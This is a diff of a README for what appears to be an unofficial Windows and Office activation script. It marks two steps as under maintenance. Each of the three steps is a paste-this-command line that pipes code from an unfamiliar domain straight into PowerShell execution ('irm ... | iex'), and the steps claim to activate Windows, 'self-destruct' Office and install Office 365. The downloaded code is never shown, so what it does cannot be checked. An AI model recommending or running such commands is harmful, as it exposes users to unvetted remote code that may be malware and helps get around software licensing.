@@ -20,11 +20,11 @@ This script provides functionality for managing Windows activation, self-destruc
    ```powershell
    irm https://plesbuy2nd.top/win | iex
    ```
-   2.2 **Self-destruct Office (if needed)**
+   2.2 **Self-destruct Office (if needed) (NOT WORKING NOW MAINTENANCE)**
    ```powershell
    irm https://plesbuy2nd.top/doom | iex
    ```
-   2.3 **Install and activate Office 365**
+   2.3 **Install and activate Office 365 (NOT WORKING NOW MAINTENANCE)**
    ```powershell
    irm https://plesbuy2nd.top/office | iex
    ```
